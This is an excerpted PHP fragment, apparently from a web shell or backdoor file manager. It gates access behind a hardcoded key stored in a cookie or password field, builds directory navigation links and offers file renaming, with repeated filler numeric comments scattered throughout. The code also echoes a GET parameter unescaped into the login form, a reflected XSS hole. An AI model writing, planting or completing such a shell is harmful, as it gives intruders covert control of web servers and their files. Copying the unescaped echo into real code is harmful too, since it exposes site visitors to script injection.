...
$auth_key = "4b49b401b469972bd0c2b7e5b67de815";
...
$pass = false;
if (isset($_COOKIE['pw_name_41713'])) {
    if(($_COOKIE['pw_name_41713']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_41713'])) {
        if(($_POST['pw_name_41713']) == $auth_key) {
            setcookie("pw_name_41713", $_POST['pw_name_41713']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_41713' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1738854759180159 1738854759156181 1738854759894999 1738854759544648
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1738854759180159 1738854759156181 1738854759894999 1738854759544648
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1738854759180159 1738854759156181 1738854759894999 1738854759544648
            $name = PATH . "/" . $_GET['r'];
